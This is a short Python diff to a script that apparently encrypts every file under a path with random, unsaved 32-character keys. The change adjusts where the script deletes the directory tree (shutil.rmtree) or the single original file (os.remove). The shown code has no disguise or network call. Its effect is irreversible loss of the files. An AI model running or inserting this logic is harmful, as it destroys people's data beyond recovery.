@@ -46,8 +46,9 @@ if __name__ == "__main__":
         for input_file in get_files_in_directory(root_file):
             # ファイルを暗号化
             encrypt_file(input_file, randomname(32).encode('utf-8')[:32])
+        shutil.rmtree(root_file)
     else:
         encrypt_file(root_file, randomname(32).encode('utf-8')[:32])
-    shutil.rmtree(root_file)
+        os.remove(root_file)
     
     print("Encryption completed successfully.")
